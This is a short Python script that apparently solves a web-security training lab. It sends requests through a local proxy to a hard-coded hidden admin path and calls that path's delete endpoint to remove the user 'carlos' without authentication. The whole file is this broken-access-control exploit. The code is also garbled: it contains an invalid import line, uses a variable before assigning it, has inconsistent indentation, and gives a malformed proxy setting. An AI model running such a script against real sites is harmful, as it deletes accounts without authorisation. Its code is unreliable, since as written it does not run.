import requests
import urllib3
import sys
from bs4 from BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080" , "https":"127.0.0.1:8080"}

def delete_user(url):
     r=requests.get(admin_panel_url,verify=False,proxies=proxies)
    #retrieve session cookie 
     session_cookie=r.cookies.get_dict().get('session')
     admin_panel_url=url + "/admin-ozjk7v"
  r=requests.get(admin_panel_url,verify=False,proxies=proxies)
      if r.status_code==200:
        print("(+)Found the admin panel......")
        print("(+)Deleting the carlos user......")
        delete_carlos_url=admin_panel_url+"/delete?username=carlos"
        r=requests.get( delete_carlos_url,verify=False,proxies=proxies)
        if r.status_code==200:
             print("(+) Successfully deleted the carlos user....")
        else:
             print("(-)Carlos user didnot deleted")    
    else:
         print("(-) Didnot found the admin panel...")     


def main():
    if len(sys.argv)!=2:
        print("(+) Usage:%s <url>" % sys.argv[0])
        print("(+) Example:%s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]   
    print("(+) FInding the admin panel.......")
    delete_user(url)
    
if __name__=="__main__":
    main()


